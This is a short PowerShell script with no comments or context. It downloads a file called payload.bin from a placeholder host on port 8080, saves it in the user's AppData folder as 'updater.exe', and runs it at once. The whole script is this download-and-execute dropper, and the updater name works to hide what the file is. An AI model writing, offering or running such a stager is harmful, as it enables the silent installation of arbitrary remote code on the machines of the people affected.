[CmdletBinding()]
param(
    [string]$PayloadUrl = 'http://contoso.com:8080/payload.bin',
    [string]$LocalPath = "$env:APPDATA\updater.exe"
)
(New-Object System.Net.WebClient).DownloadFile($PayloadUrl, $LocalPath)
Start-Process -FilePath $LocalPath
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
